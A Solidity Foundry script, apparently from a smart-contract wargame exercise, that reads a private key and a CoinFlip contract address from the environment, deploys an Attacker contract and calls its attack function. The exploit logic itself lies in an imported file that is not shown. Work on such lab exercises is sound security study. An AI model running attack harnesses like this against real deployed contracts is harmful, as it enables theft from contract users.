// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/CoinFlip.sol";
import "../src/Attacker.sol";

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address coinFlipAddress = vm.envAddress("COINFLIP_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        Attacker attacker = new Attacker(coinFlipAddress);
        attacker.attack();
        vm.stopBroadcast();
    }
}
